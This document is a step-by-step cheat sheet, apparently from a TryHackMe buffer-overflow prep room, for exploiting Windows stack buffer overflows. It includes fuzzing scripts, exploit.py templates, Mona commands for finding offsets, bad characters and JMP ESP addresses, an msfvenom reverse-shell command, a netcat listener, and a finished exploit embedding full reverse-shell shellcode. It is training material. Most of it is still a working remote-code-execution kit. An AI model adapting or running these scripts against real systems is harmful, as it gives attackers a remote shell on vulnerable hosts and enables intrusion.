# Windows - Buffer Overflows

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

#### Step 1: Ensure Mona is installed in Immunity Debugger

#### Step 2: Launch Immunity Debugger, open relevant application, and run the program with the red play button

#### Step 3: Configure working folder with this command at the bottom of Immunity Debugger:

```
!mona config -set workingfolder [FILE-PATH]
```

Example:

```
!mona config -set workingfolder c:\mona\%p
```

#### Step 4: Fuzz the application; Note the length of string that is needed to crash the application

Example Python3 Code for Fuzzing:

 ```
 #!/usr/bin/env python3

import socket, time, sys

ip = "10.10.237.191"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  ```
Example Python2 Code for Fuzzing:
```
# Credit: pencer.io (https://pencer.io/ctf/ctf-thm-gatekeeper/)

import socket, time, sys

ip = "10.9.0.78"
port = 31337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        print("Fuzzing with %s bytes" % len(string))
        s.send(string + "\r\n")
        data = s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```
  
#### Step 5: Create exploit.py skeleton:
*Most likely, the examples provided will have to be modified in some way since every program is different*
 
exploit.py Example 1:
 
```
import socket

ip = "10.10.237.191"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
 
 exploit.py Example 2:
 
```
import socket

ip = "10.10.96.43"
port = 9999

prefix = "username"
offset = 0   
overflow = "A" * offset
retn = ""   
padding = ""
payload = ""
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
 s.connect((ip, port))
 print("Sending buffer...")
 s.recv(1024)
 s.send(bytes(prefix + "\r", "latin-1"))
 s.recv(1024)
 s.send(bytes(buffer + "\r\n", "latin-1"))
 print("Done!")
except:
 print("Could not connect.")
```
  
#### Step 6: Generate cyclic pattern with this command:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [PATTERN-LENGTH]
```
*Make PATTERN-LENGTH 400 bytes longer than the string that crashed the application while fuzzing*

#### Step 7: Paste output from Step 6 into payload variable of exploit.py
  
#### Step 8: Restart application and run the program in Immunity, Run exploit.py from attack machine
 
#### Step 9: After exploit.py crashes the application, run this command in Immunity to determine offset:
 
 ```
 !mona findmsp -distance [PATTERN-LENGTH]
 ```
*PATTERN-LENGTH is the same as PATTERN-LENGTH from Step 6*

*Look for a line in the output that states: EIP contains normal pattern : ... (offset XXXX)*
 
#### Step 10: Set offset variable in exploit.py as the offset found in Step 9
 
#### Step 11: Set retn variable to "BBBB" in exploit.py

#### Step 12: Restart application and run the program in Immunity; Run exploit.py
  
#### Step 13: Ensure EIP is under control (EIP should have: 42424242)
 
#### Step 14: Create script to help generate bad characters

Example:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

#### Step 15: Run Bad Characters Script

#### Step 16: Paste Bad Characters output into payload variable of exploit.py

#### Step 17: Re-open application in Immunity but do NOT run the program

#### Step 18: Generate byte array in Immunity with this command:

```
!mona bytearray -b "\x00"
```

#### Step 19: Run the program in Immunity; Run exploit.py on attack machine

#### Step 20: Compare byte array with this command in Immunity to see possible bad characters:

```
!mona compare -f C:\mona\[VULN-APP]\bytearray.bin -a [ESP-ADDRESS]
```

#### Step 21: Remove first bad character in the list generated in Step 20 from payload variable in exploit.py

#### Step 22: Re-open Application in Immunity but do NOT run the program

#### Step 23: Generate byte array again in Immunity with same command as last time, but make sure you add the bad character to the exception list

Example:
```
!mona bytearray -b "\x00\x07"
```

#### Step 24: Repeat steps 19-23 until Step 20 says "Unmodified" in the Immunity logs (Charaters in the exeption list of bytearray are the bad characters)

#### Step 25: In crashed or running state, find jump point in Immunity with this command:

```
!mona jmp -r esp -cpb "[BAD-CHARACTERS]"
```
*Most likely, no output will be generated. View Logs in Immunity to see jump point*

#### Step 26: Write jump point address discovered backwards into the retn variable of exploit.py

For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in exploit.py

#### Step 27: Generate payload with this command:

```
msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=4444 EXITFUNC=thread -b "[BAD-CHARACTORS]" -f c
```

#### Step 28: Paste generated payload into payload variable of exploit.py
*Wrap output/payload variable in parentheses ()*

#### Step 29: Add padding to exploit.py

Example:

```
padding = "\x90" * 16
```

#### Step 30: Start netcat listener

Example:
```
nc -lnvp 4444
```

#### Step 31: Restart application and run the program in Immunity, and run exploit.py from attack machine

#### Step 32: Check listener, it should have a shell

#### Example of a Final exploit.py
```
import socket

ip = "10.10.53.94"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xb8\x03\xb7\xd7\x97\xda\xd7\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x0e\x03\x44\xb9\x35\x62\xb6\x2d\x3b"
"\x8d\x46\xae\x5c\x07\xa3\x9f\x5c\x73\xa0\xb0\x6c\xf7\xe4\x3c"
"\x06\x55\x1c\xb6\x6a\x72\x13\x7f\xc0\xa4\x1a\x80\x79\x94\x3d"
"\x02\x80\xc9\x9d\x3b\x4b\x1c\xdc\x7c\xb6\xed\x8c\xd5\xbc\x40"
"\x20\x51\x88\x58\xcb\x29\x1c\xd9\x28\xf9\x1f\xc8\xff\x71\x46"
"\xca\xfe\x56\xf2\x43\x18\xba\x3f\x1d\x93\x08\xcb\x9c\x75\x41"
"\x34\x32\xb8\x6d\xc7\x4a\xfd\x4a\x38\x39\xf7\xa8\xc5\x3a\xcc"
"\xd3\x11\xce\xd6\x74\xd1\x68\x32\x84\x36\xee\xb1\x8a\xf3\x64"
"\x9d\x8e\x02\xa8\x96\xab\x8f\x4f\x78\x3a\xcb\x6b\x5c\x66\x8f"
"\x12\xc5\xc2\x7e\x2a\x15\xad\xdf\x8e\x5e\x40\x0b\xa3\x3d\x0d"
"\xf8\x8e\xbd\xcd\x96\x99\xce\xff\x39\x32\x58\x4c\xb1\x9c\x9f"
"\xb3\xe8\x59\x0f\x4a\x13\x9a\x06\x89\x47\xca\x30\x38\xe8\x81"
"\xc0\xc5\x3d\x05\x90\x69\xee\xe6\x40\xca\x5e\x8f\x8a\xc5\x81"
"\xaf\xb5\x0f\xaa\x5a\x4c\xd8\xdf\x90\x15\xa8\x88\xa6\xa9\xd9"
"\x14\x2e\x4f\xb3\xb4\x66\xd8\x2c\x2c\x23\x92\xcd\xb1\xf9\xdf"
"\xce\x3a\x0e\x20\x80\xca\x7b\x32\x75\x3b\x36\x68\xd0\x44\xec"
"\x04\xbe\xd7\x6b\xd4\xc9\xcb\x23\x83\x9e\x3a\x3a\x41\x33\x64"
"\x94\x77\xce\xf0\xdf\x33\x15\xc1\xde\xba\xd8\x7d\xc5\xac\x24"
"\x7d\x41\x98\xf8\x28\x1f\x76\xbf\x82\xd1\x20\x69\x78\xb8\xa4"
"\xec\xb2\x7b\xb2\xf0\x9e\x0d\x5a\x40\x77\x48\x65\x6d\x1f\x5c"
"\x1e\x93\xbf\xa3\xf5\x17\xdf\x41\xdf\x6d\x48\xdc\x8a\xcf\x15"
"\xdf\x61\x13\x20\x5c\x83\xec\xd7\x7c\xe6\xe9\x9c\x3a\x1b\x80"
"\x8d\xae\x1b\x37\xad\xfa")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  ```


## Reference

* https://tryhackme.com/room/bufferoverflowprep#
